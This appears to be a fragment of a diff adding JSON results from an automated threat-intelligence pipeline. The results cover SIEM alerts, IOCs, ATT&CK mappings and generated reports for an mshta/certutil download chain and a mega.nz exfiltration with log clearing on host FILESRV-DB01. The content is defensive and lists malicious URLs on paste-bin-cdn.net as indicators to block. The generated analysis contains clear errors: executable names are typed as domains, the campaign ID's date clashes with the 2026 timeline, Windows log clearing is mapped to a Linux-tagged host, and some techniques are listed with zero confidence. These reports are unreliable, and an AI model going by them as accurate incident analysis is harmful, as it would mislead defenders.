+    "report": "### Threat Intelligence Report\n#### Executive Summary\nA potential malware campaign has been identified, leveraging `mshta.exe` and `certutil.exe` to download and execute malicious files. The campaign, dubbed `CAM-20230625-001`, has been observed on `2026-06-25` and involves techniques such as Image File Execution Options Injection, Parent PID Spoofing, and Change Default File Association. The attackers' goal appears to be establishing persistence and evading detection.\n\n#### Timeline\n* `2026-06-25T14:02:03Z`: `mshta.exe` process creation with a malicious HTA file\n* `2026-06-25T14:02:09Z`: `cmd.exe` process creation with a malicious command line\n* `2026-06-25T14:02:21Z`: `upd.exe` process creation\n* `2026-06-25T14:02:25Z`: File access event related to `sync.exe`\n\n#### IOCs\n| Value | IOC Type | Verdict | Category | Justification |\n| --- | --- | --- | --- | --- |\n| `http://paste-bin-cdn.net/load.hta` | URL | Malicious | Exploit | Associated with a potentially malicious HTA file |\n| `mshta.exe` | Domain | Suspicious | Living Off The Land (LOTL) Binary | Legitimate Windows utility used for malicious purposes |\n| `paste-bin-cdn.net` | Domain | Malicious | Malicious Domain | Known to host malicious content |\n| `load.hta` | Domain | Malicious | Malicious File | Potentially malicious HTA file |\n| `http://paste-bin-cdn.net/payload.exe` | URL | Malicious | Malware Download | Associated with the download of malicious executable files |\n| `cmd.exe` | Domain | Benign | Legitimate System Binary | Legitimate Windows command-line interpreter |\n| `certutil.exe` | Domain | Suspicious | Living Off The Land (LOTL) Binary | Legitimate Windows utility used for malicious purposes |\n| `payload.exe` | Domain | Malicious | Malicious File | Potentially malicious executable |\n| `upd.exe` | Domain | Suspicious | Potential Malware | Commonly used by malware to disguise itself |\n| `sync.exe` | Domain | Suspicious | Potential Malware | Commonly used by malware to disguise itself |\n\n#### ATT&CK Techniques\n| Technique ID | Name | Confidence | Evidence Event ID |\n| --- | --- | --- | --- |\n| `T1183` | Image File Execution Options Injection | 0.2 | `b9692003-7dba-463a-a302-3bed78cbf4ca` |\n| `T1134.004` | Parent PID Spoofing | 0.0 | `2e70ccb0-09fb-4cf8-957e-91d66677a418` |\n| `T1134.004` | Parent PID Spoofing | 0.0 | `f2e56589-695b-409e-ad43-d118cf1246e6` |\n| `T1546.001` | Change Default File Association | 0.2 | `32cd1775-768d-48d6-b0a9-2a6723eba3f0` |\n\n#### Campaign Assessment\nThe `CAM-20230625-001` campaign involves the use of `mshta.exe` and `certutil.exe` to download and execute malicious files. The attackers' goal appears to be establishing persistence and evading detection. The campaign has been observed on `2026-06-25` and involves techniques such as Image File Execution Options Injection, Parent PID Spoofing, and Change Default File Association.\n\n#### Predicted Next Steps\nBased on the observed techniques, the attackers are likely to employ the following techniques:\n* `T1036`: Masquerading to disguise malicious files or information\n* `T1027`: Obfuscated Files or Information to conceal the true nature of the files\n* `T1204.002`: Malicious File to execute malicious code\n* `T1080`: Taint Shared Content to spread the infection through shared network directories\n\nThese techniques are commonly used in attack chains to achieve persistence, evade detection, and further compromise the system.\n\n#### Recommendations\n1. **Monitor for suspicious activity**: Closely monitor system logs for suspicious activity related to `mshta.exe`, `certutil.exe`, and other Living Off The Land (LOTL) binaries.\n2. **Block malicious IOCs**: Block access to known malicious IOCs, including `http://paste-bin-cdn.net/load.hta` and `http://paste-bin-cdn.net/payload.exe`.\n3. **Implement security controls**: Implement security controls to prevent the execution of malicious files, such as `upd.exe` and `sync.exe`.\n4. **Conduct regular system audits**: Conduct regular system audits to detect and respond to potential security incidents.\n5. **Provide user education**: Provide user education on the risks associated with suspicious emails and attachments.",
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "timestamp": "2026-06-25T16:50:01Z",
+        "agent": {
+          "name": "FILESRV-DB01"
+        },
+        "rule": {
+          "description": "Large volume of files compressed into single archive (possible staging)",
+          "level": 8,
+          "groups": [
+            "data_staging",
+            "linux"
+          ]
+        }
+      },
+      {
+        "timestamp": "2026-06-25T16:52:30Z",
+        "agent": {
+          "name": "FILESRV-DB01"
+        },
+        "rule": {
+          "description": "Outbound connection to unauthorized cloud storage domain (mega.nz)",
+          "level": 11,
+          "groups": [
+            "exfiltration",
+            "policy_violation"
+          ]
+        }
+      },
+      {
+        "timestamp": "2026-06-25T16:53:05Z",
+        "agent": {
+          "name": "FILESRV-DB01"
+        },
+        "rule": {
+          "description": "Audit log cleared shortly after large file transfer",
+          "level": 14,
+          "groups": [
+            "defense_evasion",
+            "anti_forensics"
+          ]
+        }
+      }
+    ],
+    "events": [
+      {
+        "event_type": "Possible Staging",
+        "timestamp": "2026-06-25T16:50:01Z",
+        "host": "FILESRV-DB01",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "timestamp": "2026-06-25T16:50:01Z",
+          "agent": {
+            "name": "FILESRV-DB01"
+          },
+          "rule": {
+            "description": "Large volume of files compressed into single archive (possible staging)",
+            "level": 8,
+            "groups": [
+              "data_staging",
+              "linux"
+            ]
+          }
+        },
+        "event_id": "e2029855-0728-40d7-a251-286ccbc95d2f"
+      },
+      {
+        "event_type": "Exfiltration Attempt",
+        "timestamp": "2026-06-25T16:52:30Z",
+        "host": "FILESRV-DB01",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": "mega.nz",
+        "raw_source": {
+          "timestamp": "2026-06-25T16:52:30Z",
+          "agent": {
+            "name": "FILESRV-DB01"
+          },
+          "rule": {
+            "description": "Outbound connection to unauthorized cloud storage domain (mega.nz)",
+            "level": 11,
+            "groups": [
+              "exfiltration",
+              "policy_violation"
+            ]
+          }
+        },
+        "event_id": "1c9efa9b-a9fe-463c-b44c-90d316201525"
+      },
+      {
+        "event_type": "Defense Evasion",
+        "timestamp": "2026-06-25T16:53:05Z",
+        "host": "FILESRV-DB01",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "timestamp": "2026-06-25T16:53:05Z",
+          "agent": {
+            "name": "FILESRV-DB01"
+          },
+          "rule": {
+            "description": "Audit log cleared shortly after large file transfer",
+            "level": 14,
+            "groups": [
+              "defense_evasion",
+              "anti_forensics"
+            ]
+          }
+        },
+        "event_id": "9ad99f9c-45b9-44f8-b843-c87962fd4ea6"
+      }
+    ],
+    "iocs": [
+      {
+        "value": "mega.nz",
+        "ioc_type": "domain",
+        "source_event_id": "1c9efa9b-a9fe-463c-b44c-90d316201525",
+        "verdict": "suspicious",
+        "category": "Cloud Storage",
+        "justification": "Mega.nz is a cloud storage service that has been used by threat actors to host and distribute malicious content in the past."
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1608",
+        "name": "Stage Capabilities",
+        "confidence": 0.8,
+        "evidence_event_id": "e2029855-0728-40d7-a251-286ccbc95d2f"
+      },
+      {
+        "technique_id": "T1041",
+        "name": "Exfiltration Over C2 Channel",
+        "confidence": 0.8,
+        "evidence_event_id": "1c9efa9b-a9fe-463c-b44c-90d316201525"
+      },
+      {
+        "technique_id": "T1685.005",
+        "name": "Clear Windows Event Logs",
+        "confidence": 0.8,
+        "evidence_event_id": "9ad99f9c-45b9-44f8-b843-c87962fd4ea6"
+      }
+    ],
+    "campaign": {
+      "campaign_id": "CAM-2026-06-25-001",
+      "name": "Data Exfiltration and Evasion Campaign",
+      "timeline": [
+        "2026-06-25T16:50:01Z",
+        "2026-06-25T16:52:30Z",
+        "2026-06-25T16:53:05Z"
+      ],
+      "related_techniques": [
+        "T1608: Stage Capabilities",
+        "T1041: Exfiltration Over C2 Channel",
+        "T1685.005: Clear Windows Event Logs"
+      ]
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1074",
+        "T1074.002",
+        "T1685"
+      ],
+      "rationale": "Given the observed techniques, including 'Stage Capabilities', 'Exfiltration Over C2 Channel', and 'Clear Windows Event Logs', it is likely that the attacker will next use techniques related to data staging and evasion. 'Data Staged' (T1074) and 'Remote Data Staging' (T1074.002) are common techniques used to minimize connections to the C2 server and evade detection. Additionally, 'Disable or Modify Tools' (T1685) may be used to further evade detection by modifying or disabling logging mechanisms. The attacker has already demonstrated an interest in evading detection by clearing Windows Event Logs, so it is reasonable to expect they will continue to use evasion techniques."
+    },
+    "report": "### Threat Intelligence Report\n#### Executive Summary\nA threat actor has been identified conducting a data exfiltration and evasion campaign, designated as CAM-2026-06-25-001. The campaign involves staging capabilities, exfiltrating data over a command and control (C2) channel, and clearing Windows event logs to evade detection. The threat actor has been observed using the cloud storage service Mega.nz for data exfiltration. Predictive analysis suggests the attacker will likely employ techniques related to data staging and evasion in future activities.\n\n#### Timeline\n* 2026-06-25T16:50:01Z: Possible staging activity detected on host FILESRV-DB01.\n* 2026-06-25T16:52:30Z: Exfiltration attempt detected, with outbound connection to unauthorized cloud storage domain Mega.nz.\n* 2026-06-25T16:53:05Z: Defense evasion technique detected, with audit log cleared shortly after large file transfer.\n\n#### IOCs\n| Value | IOC Type | Category | Justification |\n| --- | --- | --- | --- |\n| mega.nz | Domain | Cloud Storage | Mega.nz is a cloud storage service that has been used by threat actors to host and distribute malicious content in the past. |\n\n#### ATT&CK Techniques\n| Technique ID | Name | Confidence | Evidence Event ID |\n| --- | --- | --- | --- |\n| T1608 | Stage Capabilities | 0.8 | e2029855-0728-40d7-a251-286ccbc95d2f |\n| T1041 | Exfiltration Over C2 Channel | 0.8 | 1c9efa9b-a9fe-463c-b44c-90d316201525 |\n| T1685.005 | Clear Windows Event Logs | 0.8 | 9ad99f9c-45b9-44f8-b843-c87962fd4ea6 |\n\n#### Campaign Assessment\nThe Data Exfiltration and Evasion Campaign (CAM-2026-06-25-001) is characterized by the threat actor's use of staging capabilities, exfiltration over a C2 channel, and defense evasion techniques. The campaign's timeline indicates a rapid progression of events, with the threat actor quickly moving from staging to exfiltration and evasion.\n\n#### Predicted Next Steps\nBased on the observed techniques, it is likely that the attacker will next employ techniques related to data staging and evasion, including:\n* T1074: Data Staged\n* T1074.002: Remote Data Staging\n* T1685: Disable or Modify Tools\n\nThe rationale for this prediction is that the threat actor has already demonstrated an interest in evading detection and has used techniques to minimize connections to the C2 server. The use of data staging and evasion techniques would be consistent with this behavior.\n\n#### Recommendations\n1. **Monitor for suspicious activity**: Closely monitor systems for signs of data staging, exfiltration, and evasion, particularly activity related to cloud storage services.\n2. **Block Mega.nz**: Consider blocking access to Mega.nz to prevent further exfiltration attempts.\n3. **Implement logging and auditing**: Ensure that logging and auditing mechanisms are in place to detect and respond to potential security incidents.\n4. **Conduct regular security assessments**: Regularly conduct security assessments to identify vulnerabilities and weaknesses that could be exploited by threat actors.",
+    "errors": [],
+    "metadata": {}
+  }
+]
